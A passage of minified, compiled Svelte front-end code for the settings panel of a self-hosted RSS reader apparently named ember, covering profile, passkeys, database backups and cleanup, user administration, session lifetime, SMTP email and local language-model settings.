svelte-1u3w06f">Delete articles older than the chosen window that aren't starred, in a board, or saved for later. Compacts the file afterwards.</p> <div class="rec-row svelte-1u3w06f"><label class="inline-label svelte-1u3w06f"><span class="svelte-1u3w06f">Older than (days)</span> <input type="number" min="7" max="3650" data-testid="db-cleanup-days" class="svelte-1u3w06f"/></label> <button class="ghost-btn svelte-1u3w06f" data-testid="db-cleanup"> </button></div> <h4 class="svelte-1u3w06f">Schedule</h4> <p class="hint svelte-1u3w06f">Automatic backups and cleanup, run by a background job. Tick every hour; missed runs catch up on the next tick.</p> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Backup</div> <div class="pref-hint svelte-1u3w06f"> </div></div> <div class="seg svelte-1u3w06f"><button>Off</button> <button>Daily</button> <button>Weekly</button></div></div> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Cleanup</div> <div class="pref-hint svelte-1u3w06f"> </div></div> <div class="seg svelte-1u3w06f"><button>Off</button> <button>Weekly</button> <button>Monthly</button></div></div> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">OPML export</div> <div class="pref-hint svelte-1u3w06f">Writes the admin user's subscription list to /data/exports/ on the chosen cadence.</div></div> <div class="seg svelte-1u3w06f"><button>Off</button> <button>Weekly</button> <button>Monthly</button></div></div> <div class="rec-row svelte-1u3w06f"><label class="inline-label svelte-1u3w06f"><span class="svelte-1u3w06f">Keep N backups</span> <input type="number" min="1" max="365" data-testid="db-keep" class="svelte-1u3w06f"/></label> <label class="inline-label svelte-1u3w06f"><span class="svelte-1u3w06f">Cleanup window (days)</span> <input type="number" min="7" max="3650" data-testid="db-cleanup-days-sched" class="svelte-1u3w06f"/></label></div> <div class="actions svelte-1u3w06f"><button data-testid="db-schedule-save" class="svelte-1u3w06f"> </button></div>`,1),jl=U(`<h3 class="svelte-1u3w06f">Database</h3> <!> <!> <!>`,1),Ml=U(`<p class="error svelte-1u3w06f" data-testid="users-error"> </p>`),Nl=U(`<p class="ok svelte-1u3w06f" data-testid="users-msg"> </p>`),Pl=U(`<p class="muted">Loading…</p>`),Fl=U(`<span class="muted">(you)</span>`),Il=U(`<button class="ghost-btn svelte-1u3w06f"> </button>`),Ll=U(`<tr><td class="svelte-1u3w06f"><strong> </strong> <!></td><td class="svelte-1u3w06f"> </td><td class="svelte-1u3w06f"><div class="seg svelte-1u3w06f"><button>Yes</button> <button>No</button></div></td><td class="llm-actions svelte-1u3w06f"><!></td></tr>`),Rl=U(`<table class="llm-table svelte-1u3w06f" data-testid="users-table"><thead><tr><th class="svelte-1u3w06f">Username</th><th class="svelte-1u3w06f">Email</th><th class="svelte-1u3w06f">Admin</th><th class="svelte-1u3w06f"></th></tr></thead><tbody></tbody></table>`),zl=U(`<h3 class="svelte-1u3w06f">Users</h3> <p class="hint svelte-1u3w06f">Admin-only. Create new accounts, toggle admin, and remove users.</p> <!> <!> <h4 class="svelte-1u3w06f">New user</h4> <div class="row svelte-1u3w06f"><label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Username</span> <input type="text" autocomplete="username" data-testid="new-user-username" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Email (optional)</span> <input type="email" autocomplete="email" data-testid="new-user-email" class="svelte-1u3w06f"/></label></div> <div class="row svelte-1u3w06f"><label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Password</span> <input type="password" autocomplete="new-password" data-testid="new-user-password" class="svelte-1u3w06f"/></label></div> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Admin</div> <div class="pref-hint svelte-1u3w06f">Grants access to Settings → Branding / Database / Sessions / Users / LLM.</div></div> <div class="seg svelte-1u3w06f"><button data-testid="new-user-admin-on">Yes</button> <button data-testid="new-user-admin-off">No</button></div></div> <div class="actions svelte-1u3w06f"><button data-testid="create-user-submit" class="svelte-1u3w06f"> </button></div> <h4 class="svelte-1u3w06f">Existing users</h4> <!>`,1),Bl=U(`<p class="error svelte-1u3w06f" data-testid="session-error"> </p>`),Vl=U(`<p class="ok svelte-1u3w06f" data-testid="session-msg"> </p>`),Hl=U(`<p class="pref-hint svelte-1u3w06f"> <span style="opacity:0.6"> </span></p>`),Ul=U(`<option class="svelte-1u3w06f"> </option>`),Wl=U(`<h3 class="svelte-1u3w06f">Sessions</h3> <p class="hint svelte-1u3w06f">Server-wide session lifetime — how long a freshly-issued login cookie stays valid.
+            Affects newly-issued sessions only; existing sessions keep their stored expiry.
+            Range: 5 minutes to 90 days.</p> <!> <!> <!> <label class="pref-row svelte-1u3w06f"><span class="svelte-1u3w06f">Preset</span> <select data-testid="session-preset" class="svelte-1u3w06f"></select></label> <label class="pref-row svelte-1u3w06f"><span class="svelte-1u3w06f">Custom (seconds)</span> <input type="number" min="300" max="7776000" step="60" data-testid="session-seconds" class="svelte-1u3w06f"/></label> <div class="actions svelte-1u3w06f"><button data-testid="session-save" class="svelte-1u3w06f"> </button></div>`,1),Gl=U(`<input type="password" placeholder="•••• stored — leave blank to keep" autocomplete="new-password" data-testid="smtp-password" class="svelte-1u3w06f"/>`),Kl=U(`<input type="password" autocomplete="new-password" data-testid="smtp-password" class="svelte-1u3w06f"/>`),ql=U(`<label class="check svelte-1u3w06f" style="margin-top:8px;"><input type="checkbox" data-testid="smtp-clear-password" class="svelte-1u3w06f"/> Clear stored password on save</label>`),Jl=U(`<p class="ok svelte-1u3w06f" data-testid="email-msg"> </p>`),Yl=U(`<p class="err" data-testid="email-err"> </p>`),Xl=U(`<h3 class="svelte-1u3w06f">Email / SMTP</h3> <p class="hint svelte-1u3w06f">Configure the relay used for daily digest emails. These fields override the
+            corresponding <code>EMBER_SMTP_*</code> environment variables at runtime;
+            changes take effect on the next digest tick (~5 minutes).</p> <div class="form-grid svelte-1u3w06f" style="display:grid;grid-template-columns:1fr 1fr;gap:10px 16px;"><label class="svelte-1u3w06f">SMTP host <input type="text" placeholder="smtp.example.com" data-testid="smtp-host" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f">Port <input type="number" min="1" max="65535" data-testid="smtp-port" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f">Username <input type="text" autocomplete="off" data-testid="smtp-user" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f">Password <!></label> <label style="grid-column: 1 / -1;" class="svelte-1u3w06f">From address <input type="email" placeholder="ember@example.com" data-testid="smtp-from" class="svelte-1u3w06f"/></label></div> <label class="toggle-row svelte-1u3w06f"><span class="toggle-label svelte-1u3w06f"><span class="toggle-title svelte-1u3w06f">Use STARTTLS</span> <span class="toggle-hint svelte-1u3w06f">Recommended for submission ports (587). Disable only when targeting a relay that doesn't support it.</span></span> <span class="switch svelte-1u3w06f"><input type="checkbox" data-testid="smtp-starttls" class="svelte-1u3w06f"/> <span class="track svelte-1u3w06f" aria-hidden="true"></span></span></label> <!> <!> <!> <div class="actions svelte-1u3w06f" style="margin-top:12px;"><button data-testid="email-save" class="svelte-1u3w06f"> </button></div> <hr style="margin:18px 0;border:0;border-top:1px solid var(--line);"/> <h4 class="svelte-1u3w06f">Send test email</h4> <p class="hint svelte-1u3w06f">Uses the live SMTP settings above. Save first if you've made changes.</p> <div style="display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap;"><label style="flex:1 1 240px;" class="svelte-1u3w06f">Recipient (defaults to your account email) <input type="email" placeholder="you@example.com" data-testid="smtp-test-to" class="svelte-1u3w06f"/></label> <button data-testid="smtp-test-send"> </button></div> <hr style="margin:18px 0;border:0;border-top:1px solid var(--line);"/> <h4 class="svelte-1u3w06f">Initial backlog window</h4> <p class="hint svelte-1u3w06f">When a new feed (or starter pack) is added, articles published more than this
+            many hours ago are skipped. Subsequent polls of the feed are unaffected.
+            Set to <code>0</code> to disable the gate and ingest a feed's full upstream history.</p> <label class="svelte-1u3w06f">Hours <input type="number" min="0" max="8760" data-testid="backlog-hours" style="width:140px;" class="svelte-1u3w06f"/></label> <div class="actions svelte-1u3w06f" style="margin-top:12px;"><button data-testid="backlog-save" class="svelte-1u3w06f"> </button></div>`,1),Zl=U(`<a class="version-badge svelte-1u3w06f" target="_blank" rel="noopener noreferrer" data-testid="about-version"> </a>`),Ql=U(`<span class="version-badge version-badge-dev svelte-1u3w06f" data-testid="about-version"> </span>`),$l=U(`<h3 class="svelte-1u3w06f">About</h3> <dl class="kv svelte-1u3w06f"><dt class="svelte-1u3w06f">Version</dt> <dd class="svelte-1u3w06f"><!></dd> <dt class="svelte-1u3w06f">Project</dt><dd class="svelte-1u3w06f"><a href="https://github.com/brandonhon/ember" target="_blank" rel="noopener noreferrer" class="svelte-1u3w06f">github.com/brandonhon/ember</a></dd> <dt class="svelte-1u3w06f">License</dt><dd class="svelte-1u3w06f">private</dd></dl>`,1),eu=U(`<div class="backdrop svelte-1u3w06f" role="dialog" aria-modal="true" aria-labelledby="settings-title" data-testid="settings"><div><header class="svelte-1u3w06f"><!> <button class="close svelte-1u3w06f" aria-label="Close">×</button></header> <div class="layout svelte-1u3w06f"><nav class="nav svelte-1u3w06f" aria-label="Settings sections"><button data-testid="settings-profile">Profile</button> <button data-testid="settings-passkeys">Passkeys</button> <button>Preferences</button> <button>Mobile clients</button> <button>Filters</button> <button data-testid="settings-stats">Reading stats</button> <button data-testid="settings-digest">Daily digest</button> <button data-testid="settings-starter">Starter packs</button> <!> <button>About</button></nav> <div class="content svelte-1u3w06f"><!> <!> <!> <!> <!> <!> <!> <!> <!> <!> <!> <!> <!> <!> <!></div></div></div> <!> <!></div>`);function tu(e,t){qe(t,!0);let n=()=>M(ba,`$branding`,d),r=()=>M(da,`$activeView`,d),i=()=>M(Yi,`$user`,d),a=()=>M(ha,`$theme`,d),o=()=>M(Sa,`$density`,d),s=()=>M(Xi,`$feverAPIKey`,d),c=()=>M(va,`$customPalette`,d),l=()=>M(wa,`$showSummary`,d),u=()=>M(Zi,`$appVersion`,d),[d,f]=gt(),p=P(null),m=P(!1);async function h(){if(V(p)){F(m,!0);try{await V(p).run(),F(p,null)}finally{F(m,!1)}}}let g=P(`profile`),_=P(hn(typeof window<`u`&&window.matchMedia?.(`(max-width: 900px)`).matches)),v=P(!1);Vn(()=>{if(typeof window>`u`)return;let e=window.matchMedia(`(max-width: 900px)`),t=e=>{F(_,e.matches,!0),e.matches||F(v,!1)};return e.addEventListener(`change`,t),()=>e.removeEventListener(`change`,t)});function y(e){F(g,e,!0),V(_)&&F(v,!0)}function b(){F(v,!1)}let x=Qt(()=>{switch(V(g)){case`profile`:return`Profile`;case`passkeys`:return`Passkeys`;case`preferences`:return`Preferences`;case`mobile`:return`Mobile clients`;case`filters`:return`Filters`;case`stats`:return`Reading stats`;case`digest`:return`Daily digest`;case`starter`:return`Starter packs`;case`llm`:return`Language model`;case`branding`:return`Branding`;case`database`:return`Database`;case`session`:return`Sessions`;case`email`:return`Email / SMTP`;case`users`:return`Users`;case`about`:return`About`}}),S=P(null),C=P(``),w=P(``),ee=P(!1);async function te(){F(C,``);try{F(S,(await $.getDigest()).data,!0)}catch(e){F(C,e instanceof Z?e.message:String(e),!0)}}async function T(){if(V(S)){F(ee,!0),F(w,``),F(C,``);try{F(S,(await $.setDigest(V(S))).data,!0),F(w,`Saved`)}catch(e){F(C,e instanceof Z?e.message:String(e),!0)}finally{F(ee,!1),setTimeout(()=>F(w,``),3e3)}}}let E=P(null),ne=P(``);async function re(){F(ne,``);try{F(E,(await $.getStats()).data,!0)}catch(e){F(ne,e instanceof Z?e.message:String(e),!0)}}let D=P(null),O=P(``),ie=P(``),ae=P(``),oe=P(90);async function se(){F(O,``);try{let e=await $.getDBStatus();F(D,e.data,!0),F(oe,e.data.cleanup_older_days||90,!0)}catch(e){F(O,e instanceof Z?e.message:String(e),!0)}}async function ce(){F(ae,`backup`),F(ie,``),F(O,``);try{await $.dbBackup(),await se(),F(ie,`Backup created`)}catch(e){F(O,e instanceof Z?e.message:String(e),!0)}finally{F(ae,``),setTimeout(()=>F(ie,``),3e3)}}function le(){F(p,{title:`Clean up old articles?`,message:`Permanently delete articles older than ${V(oe)} days that aren't starred, in a board, or saved for later. The database file is compacted afterwards.`,confirmLabel:`Clean up`,destructive:!0,run:()=>ue()},!0)}async function ue(){F(ae,`cleanup`),F(ie,``),F(O,``);try{let{articles_deleted:e,bytes_reclaimed:t}=(await $.dbCleanup(V(oe))).data;F(ie,`Deleted ${e} articles, reclaimed ${(t/(1024*1024)).toFixed(1)} MiB`),await se()}catch(e){F(O,e instanceof Z?e.message:String(e),!0)}finally{F(ae,``),setTimeout(()=>F(ie,``),5e3)}}async function de(){if(V(D)){F(ae,`schedule`),F(ie,``),F(O,``);try{await $.dbSchedule({backup_schedule:V(D).backup_schedule,backup_keep_count:V(D).backup_keep_count,cleanup_schedule:V(D).cleanup_schedule,cleanup_older_days:V(D).cleanup_older_days,opml_schedule:V(D).opml_schedule||`off`}),F(ie,`Schedule saved`)}catch(e){F(O,e instanceof Z?e.message:String(e),!0)}finally{F(ae,``),setTimeout(()=>F(ie,``),3e3)}}}function fe(e){if(!e)return`—`;let t=e/(1024*1024*1024);return t>=1?t.toFixed(2)+` GiB`:(e/(1024*1024)).toFixed(1)+` MiB`}function pe(e){return e?new Date(e*1e3).toLocaleString():``}let me=P(hn({name:``,page_title:``,favicon_url:``})),he=P(``),ge=P(``),_e=P(!1);function ve(){F(me,{name:n().name,page_title:n().page_title,favicon_url:n().favicon_url},!0)}async function ye(){F(_e,!0),F(he,``),F(ge,``);try{await $.setBranding(V(me)),await xa(),F(he,`Saved`)}catch(e){F(ge,e instanceof Z?e.message:String(e),!0)}finally{F(_e,!1),setTimeout(()=>F(he,``),3e3)}}async function be(){F(me,{name:``,page_title:``,favicon_url:``},!0),await ye(),ve()}let xe=P(hn([])),Se=P(``),Ce=P(``),we=P(``);function Te(e){return e.subscribed>=e.feed_urls.length}async function Ee(){try{F(xe,(await $.listStarterPacks()).data??[],!0)}catch(e){F(we,e instanceof Z?e.message:String(e),!0)}}async function De(e){F(Se,e,!0),F(Ce,``),F(we,``);try{let t=(await $.importStarterPack(e)).data,n=[];t.feeds_added&&n.push(`${t.feeds_added} added`),t.already_had&&n.push(`${t.already_had} already subscribed`),t.failed_urls?.length&&n.push(`${t.failed_urls.length} failed`),F(Ce,n.join(` · `)||`Nothing to add`,!0),await ca(),await ja(r()),setTimeout(()=>{ca()},2e3),await Ee()}catch(e){F(we,e instanceof Z?e.message:String(e),!0)}finally{F(Se,``),setTimeout(()=>F(Ce,``),4e3)}}async function Oe(e){if(confirm(`Unsubscribe from every feed in this pack? Feeds you have starred articles in are not deleted.`)){F(Se,e,!0),F(Ce,``),F(we,``);try{let t=(await $.removeStarterPack(e)).data,n=[];t.feeds_removed&&n.push(`${t.feeds_removed} removed`),t.not_subscribed&&n.push(`${t.not_subscribed} not subscribed`),t.category_removed&&n.push(`folder cleared`),F(Ce,n.join(` · `)||`Nothing to remove`,!0),await ca(),await Ee()}catch(e){F(we,e instanceof Z?e.message:String(e),!0)}finally{F(Se,``),setTimeout(()=>F(Ce,``),4e3)}}}let ke=P(null),Ae=P(``),je=P(``),Me=P(``),k=P(``);async function Ne(){F(Ae,``);try{F(ke,(await $.getLLMStatus()).data,!0),!V(k)&&V(ke)?.recommended?.model&&F(k,V(ke).recommended.model,!0)}catch(e){F(Ae,e instanceof Z?e.message:String(e),!0)}}async function A(e){F(Me,`switch:`+e),F(je,``),F(Ae,``);try{await $.setLLMModel(e),F(je,`Now using ${e}`),await Ne()}catch(e){F(Ae,e instanceof Z?e.message:String(e),!0)}finally{F(Me,``),setTimeout(()=>F(je,``),3e3)}}function Pe(e){F(p,{title:`Delete model?`,message:`Remove "${e}" from local storage. The model files are deleted from Ollama's cache.`,confirmLabel:`Delete`,destructive:!0,run:()=>Fe(e)},!0)}async function Fe(e){F(Me,`delete:`+e),F(je,``),F(Ae,``);try{await $.deleteLLMModel(e),F(je,`Deleted ${e}`),await Ne()}catch(e){F(Ae,e instanceof Z?e.message:String(e),!0)}finally{F(Me,``),setTimeout(()=>F(je,``),3e3)}}let Le=P(0),Re=P(0),ze=P(0),Be=P(!1),Ve=P(``);function He(){V(ke)&&(F(Le,V(ke).options?.temperature??0,!0),F(Re,V(ke).options?.top_p??0,!0),F(ze,V(ke).options?.num_ctx??0,!0))}async function Ue(){F(Be,!0),F(Ae,``),F(Ve,``);try{await $.setLLMOptions({temperature:Number(V(Le))||0,top_p:Number(V(Re))||0,num_ctx:Number(V(ze))||0}),F(Ve,`Saved`),await Ne()}catch(e){F(Ae,e instanceof Z?e.message:String(e),!0)}finally{F(Be,!1),setTimeout(()=>F(Ve,``),3e3)}}Vn(()=>{He()});async function We(){let e=V(k).trim();if(e){F(Me,`pull:`+e),F(je,``),F(Ae,``);try{await $.pullLLMModel(e),F(je,`Pulled ${e}`),await Ne()}catch(e){F(Ae,e instanceof Z?e.message:String(e),!0)}finally{F(Me,``),setTimeout(()=>F(je,``),4e3)}}}function Ge(e){return e?(e/(1024*1024*1024)).toFixed(1)+` GiB`:`—`}function Ke(e){return e?(e/(1024*1024)).toFixed(0)+` MiB`:`—`}let Ye=no(),Xe=P(hn([])),Ze=P(``),Qe=P(``),$e=P(``),et=P(``);async function tt(){F(Ze,``);try{F(Xe,(await $.listPasskeys()).data??[],!0)}catch(e){F(Ze,e instanceof Z?e.message:String(e),!0)}}async function nt(){F($e,`register`),F(Ze,``),F(Qe,``);try{let e=await $.passkeyRegisterBegin(),t=await eo(e.data.options),n=V(et).trim()||`Passkey`;await $.passkeyRegisterFinish(e.data.session_id,n,t),F(et,``),F(Qe,`Passkey added`),await tt()}catch(e){e instanceof Z?F(Ze,e.message||`Registration failed`,!0):e instanceof DOMException?F(Ze,`Registration cancelled`):F(Ze,String(e),!0)}finally{F($e,``),setTimeout(()=>F(Qe,``),3e3)}}function rt(e){F(p,{title:`Remove passkey?`,message:`Devices using "${e.name}" won't be able to sign in with it anymore.`,confirmLabel:`Remove`,destructive:!0,run:()=>it(e.id)},!0)}async function it(e){F($e,`delete:`+e),F(Ze,``);try{await $.deletePasskey(e),await tt()}catch(e){F(Ze,e instanceof Z?e.message:String(e),!0)}finally{F($e,``)}}Vn(()=>{V(g)===`starter`&&Ee(),V(g)===`llm`&&i()?.is_admin&&Ne(),V(g)===`branding`&&i()?.is_admin&&ve(),V(g)===`database`&&i()?.is_admin&&se(),V(g)===`session`&&i()?.is_admin&&ut(),V(g)===`email`&&i()?.is_admin&&N(),V(g)===`users`&&i()?.is_admin&&Ht(),V(g)===`stats`&&re(),V(g)===`digest`&&te(),V(g)===`passkeys`&&tt()});let at=P(null),ot=P(86400),st=P(``),ct=P(``),lt=P(!1);async function ut(){F(ct,``);try{let e=await $.getSessionTTL();F(at,e.data,!0),F(ot,e.data.ttl_seconds,!0)}catch(e){F(ct,e instanceof Z?e.message:String(e),!0)}}async function dt(){F(lt,!0),F(st,``),F(ct,``);try{F(at,(await $.setSessionTTL(V(ot))).data,!0),F(st,`Saved`)}catch(e){F(ct,e instanceof Z?e.message:String(e),!0)}finally{F(lt,!1),setTimeout(()=>F(st,``),3e3)}}let ft=[{label:`1 hour`,seconds:3600},{label:`4 hours`,seconds:14400},{label:`24 hours (default)`,seconds:86400},{label:`7 days`,seconds:604800},{label:`30 days`,seconds:2592e3}];Gi(()=>{typeof location<`u`&&location.hash===`#starter`&&F(g,`starter`)});let pt=P(hn({host:``,port:587,username:``,password:``,clear_password:!1,from:``,starttls:!0,initial_backlog_hours:48})),mt=P(null),ht=P(!1),_t=P(``),yt=P(``),bt=P(``),xt=P(!1);async function N(){F(yt,``);try{let e=await $.getAdminSettings();F(mt,e.data,!0),F(pt,{host:e.data.smtp.host,port:e.data.smtp.port,username:e.data.smtp.username,password:``,clear_password:!1,from:e.data.smtp.from,starttls:e.data.smtp.starttls,initial_backlog_hours:e.data.initial_backlog_hours},!0)}catch(e){F(yt,e instanceof Z?e.message:String(e),!0)}}async function St(){F(ht,!0),F(_t,``),F(yt,``);try{let e={smtp:{host:V(pt).host.trim(),port:Number(V(pt).port)||0,username:V(pt).username.trim(),from:V(pt).from.trim(),starttls:!!V(pt).starttls},initial_backlog_hours:Math.max(0,Number(V(pt).initial_backlog_hours)||0)};V(pt).clear_password?e.smtp.clear_password=!0:V(pt).password&&(e.smtp.password=V(pt).password),F(mt,(await $.setAdminSettings(e)).data,!0),V(pt).password=``,V(pt).clear_password=!1,F(_t,`Saved`)}catch(e){F(yt,e instanceof Z?e.message:String(e),!0)}finally{F(ht,!1),setTimeout(()=>F(_t,``),3e3)}}async function Ct(){F(xt,!0),F(_t,``),F(yt,``);try{F(_t,`Test sent to ${(await $.testEmail(V(bt).trim()||void 0)).data.sent_to}`)}catch(e){F(yt,e instanceof Z?e.message:String(e),!0)}finally{F(xt,!1),setTimeout(()=>F(_t,``),4e3)}}let wt=P(``),Tt=P(``),Et=P(``),Dt=P(!1),Ot=P(``),kt=P(``);async function At(){if(F(Ot,``),F(kt,``),V(Tt)!==V(Et)){F(kt,`passwords do not match`);return}if(V(Tt).length<8){F(kt,`new password must be at least 8 characters`);return}F(Dt,!0);try{await $.changePassword(V(wt),V(Tt)),F(Ot,`Password changed.`),F(wt,``),F(Tt,``),F(Et,``)}catch(e){F(kt,e instanceof Z?e.message:String(e),!0)}finally{F(Dt,!1),setTimeout(()=>F(Ot,``),4e3)}}Vn(()=>{typeof localStorage>`u`||(localStorage.setItem(`ember:theme`,a()),localStorage.setItem(`ember:density`,o()))});function jt(){s()&&navigator.clipboard?.writeText(s()).catch(()=>{})}let Mt=Qt(()=>typeof location<`u`?`${location.origin}/fever`:``),Nt=P(!1),Pt=P(hn([])),Ft=P(``),It=P(``),Lt=P(``),Rt=P(``),zt=P(``),Bt=P(``),Vt=P(!1);async function Ht(){F(Ft,``);try{F(Pt,(await $.listUsers()).data??[],!0)}catch(e){F(Ft,e instanceof Z?e.message:String(e),!0)}}async function Ut(){if(!V(Rt).trim()||!V(Bt).trim()){F(Ft,`username and password required`);return}F(Lt,`create`),F(Ft,``),F(It,``);try{await $.createUser({username:V(Rt).trim(),email:V(zt).trim()||void 0,password:V(Bt),is_admin:V(Vt)}),F(Rt,``),F(zt,``),F(Bt,``),F(Vt,!1),await Ht(),F(It,`User created`)}catch(e){F(Ft,e instanceof Z?e.message:String(e),!0)}finally{F(Lt,``),setTimeout(()=>F(It,``),3e3)}}async function Wt(e){let t=!e.is_admin;F(Lt,`admin:${e.id}`),F(Ft,``);try{await $.updateUser(e.id,{is_admin:t}),F(Pt,V(Pt).map(n=>n.id===e.id?{...n,is_admin:t}:n),!0)}catch(e){F(Ft,e instanceof Z?e.message:String(e),!0)}finally{F(Lt,``)}}function Gt(e){F(p,{title:`Delete user?`,message:`Permanently delete the account "${e.username}". This cannot be undone.`,confirmLabel:`Delete`,destructive:!0,run:()=>Kt(e.id)},!0)}async function Kt(e){F(Lt,`delete:${e}`),F(Ft,``);try{await $.deleteUser(e),await Ht()}catch(e){F(Ft,e instanceof Z?e.message:String(e),!0)}finally{F(Lt,``)}}function qt(){$i(),t.onClose()}var Jt=eu(),Yt=I(Jt);let Xt;var Zt=I(Yt),$t=I(Zt),en=e=>{var t=Ec(),n=L(t),r=R(n,2),i=I(r,!0);j(r),z(()=>G(i,V(x))),H(`click`,n,b),W(e,t)},tn=e=>{W(e,Dc())};K($t,e=>{V(_)&&V(v)?e(en):e(tn,-1)});var nn=R($t,2);j(Zt);var rn=R(Zt,2),an=I(rn),on=I(an);let sn;var cn=R(on,2);let ln;var un=R(cn,2);let dn;var fn=R(un,2);let pn;var mn=R(fn,2);let gn;var _n=R(mn,2);let vn;var yn=R(_n,2);let bn;var xn=R(yn,2);let Sn;var Cn=R(xn,2),wn=e=>{var t=Oc(),n=L(t);let r;var i=R(n,2);let a;var o=R(i,2);let s;var c=R(o,2);let l;var u=R(c,2);let d;var f=R(u,2);let p;z(()=>{r=q(n,1,`svelte-1u3w06f`,null,r,{active:V(g)===`llm`}),a=q(i,1,`svelte-1u3w06f`,null,a,{active:V(g)===`branding`}),s=q(o,1,`svelte-1u3w06f`,null,s,{active:V(g)===`database`}),l=q(c,1,`svelte-1u3w06f`,null,l,{active:V(g)===`session`}),d=q(u,1,`svelte-1u3w06f`,null,d,{active:V(g)===`email`}),p=q(f,1,`svelte-1u3w06f`,null,p,{active:V(g)===`users`})}),H(`click`,n,()=>y(`llm`)),H(`click`,i,()=>y(`branding`)),H(`click`,o,()=>y(`database`)),H(`click`,c,()=>y(`session`)),H(`click`,u,()=>y(`email`)),H(`click`,f,()=>y(`users`)),W(e,t)};K(Cn,e=>{i()?.is_admin&&e(wn)});var Tn=R(Cn,2);let En;j(an);var Dn=R(an,2),On=I(Dn),kn=e=>{var t=jc(),n=R(L(t),2),r=I(n),a=R(I(r),2);J(a),j(r);var o=R(r,2),s=R(I(o),2);J(s),j(o),j(n);var c=R(n,6),l=e=>{var t=kc(),n=I(t,!0);j(t),z(()=>G(n,V(kt))),W(e,t)};K(c,e=>{V(kt)&&e(l)});var u=R(c,2),d=e=>{var t=Ac(),n=I(t,!0);j(t),z(()=>G(n,V(Ot))),W(e,t)};K(u,e=>{V(Ot)&&e(d)});var f=R(u,2),p=R(I(f),2);J(p),j(f);var m=R(f,2),h=R(I(m),2);J(h),j(m);var g=R(m,2),_=R(I(g),2);J(_),j(g);var v=R(g,2),y=I(v),b=I(y,!0);j(y),j(v),z(()=>{ji(a,i()?.username??``),ji(s,i()?.email??``),y.disabled=V(Dt)||!V(wt)||!V(Tt),G(b,V(Dt)?`Saving…`:`Change password`)}),X(p,()=>V(wt),e=>F(wt,e)),X(h,()=>V(Tt),e=>F(Tt,e)),X(_,()=>V(Et),e=>F(Et,e)),H(`click`,y,At),W(e,t)};K(On,e=>{V(g)===`profile`&&e(kn)});var An=R(On,2),jn=e=>{var t=zc(),n=R(L(t),2),r=e=>{W(e,Mc())},i=e=>{var t=Rc(),n=R(L(t),2),r=e=>{var t=Nc(),n=I(t,!0);j(t),z(()=>G(n,V(Ze))),W(e,t)};K(n,e=>{V(Ze)&&e(r)});var i=R(n,2),a=e=>{var t=Pc(),n=I(t,!0);j(t),z(()=>G(n,V(Qe))),W(e,t)};K(i,e=>{V(Qe)&&e(a)});var o=R(i,4),s=R(I(o),2);J(s),j(o);var c=R(o,2),l=I(c),u=I(l,!0);j(l),j(c);var d=R(c,4),f=e=>{W(e,Fc())},p=e=>{var t=Lc();li(t,21,()=>V(Xe),e=>e.id,(e,t)=>{var n=Ic(),r=I(n),i=I(r),a=I(i,!0);j(i);var o=R(i,2),s=I(o),c=R(s),l=e=>{var n=Qr();z(e=>G(n,`· last used ${e??``}`),[()=>new Date(V(t).last_used_at*1e3).toLocaleDateString()]),W(e,n)};K(c,e=>{V(t).last_used_at&&e(l)}),j(o),j(r);var u=R(r,2);j(n),z(e=>{G(a,V(t).name),G(s,`Added ${e??``} `),u.disabled=V($e)===`delete:`+V(t).id},[()=>new Date(V(t).created_at*1e3).toLocaleDateString()]),H(`click`,u,()=>rt(V(t))),W(e,n)}),j(t),W(e,t)};K(d,e=>{V(Xe).length===0?e(f):e(p,-1)}),z(()=>{l.disabled=V($e)===`register`,G(u,V($e)===`register`?`Waiting for device…`:`Register passkey`)}),X(s,()=>V(et),e=>F(et,e)),H(`click`,l,nt),W(e,t)};K(n,e=>{Ye?e(i,-1):e(r)}),W(e,t)};K(An,e=>{V(g)===`passkeys`&&e(jn)});var Mn=R(An,2),Nn=e=>{var t=Hc(),n=R(L(t),2),r=R(I(n),2);li(r,21,()=>ma,e=>e.value,(e,t)=>{var n=Bc();let r;var i=I(n),o=R(i,2),s=I(o,!0);j(o),j(n),z(()=>{r=q(n,1,`theme-tile svelte-1u3w06f`,null,r,{on:a()===V(t).value}),Y(n,`data-mood`,V(t).mood),Y(n,`data-testid`,`theme-${V(t).value??``}`),Y(n,`aria-pressed`,a()===V(t).value),Y(i,`data-theme-preview`,V(t).value),G(s,V(t).label)}),H(`click`,n,()=>ha.set(V(t).value)),W(e,n)}),j(r),j(n);var i=R(n,2),s=e=>{var t=Vc(),n=R(I(t),2),r=I(n),i=R(I(r),2);J(i),j(r);var a=R(r,2),o=R(I(a),2);J(o),j(a);var s=R(a,2),l=R(I(s),2);J(l),j(s);var u=R(s,2),d=R(I(u),2);J(d),j(u),j(n),j(t),X(i,()=>c().paper,e=>vt(va,Fr(c).paper=e,Fr(c))),X(o,()=>c().ink,e=>vt(va,Fr(c).ink=e,Fr(c))),X(l,()=>c().ember,e=>vt(va,Fr(c).ember=e,Fr(c))),X(d,()=>c().link,e=>vt(va,Fr(c).link=e,Fr(c))),W(e,t)};K(i,e=>{a()===`custom`&&e(s)});var u=R(i,2),d=R(I(u),2),f=I(d);let p;var m=R(f,2);let h;j(d),j(u);var g=R(u,2),_=R(I(g),2),v=I(_);let y;var b=R(v,2);let x;j(_),j(g),z(()=>{p=q(f,1,`svelte-1u3w06f`,null,p,{on:o()===`card`}),h=q(m,1,`svelte-1u3w06f`,null,h,{on:o()===`compact`}),y=q(v,1,`svelte-1u3w06f`,null,y,{on:l()}),x=q(b,1,`svelte-1u3w06f`,null,x,{on:!l()})}),H(`click`,f,()=>Sa.set(`card`)),H(`click`,m,()=>Sa.set(`compact`)),H(`click`,v,()=>wa.set(!0)),H(`click`,b,()=>wa.set(!1)),W(e,t)};K(Mn,e=>{V(g)===`preferences`&&e(Nn)});var Pn=R(Mn,2),Fn=e=>{var t=Uc(),n=R(L(t),4),r=R(I(n),2);J(r),j(n);var i=R(n,2),a=R(I(i),2);J(a),j(i);var 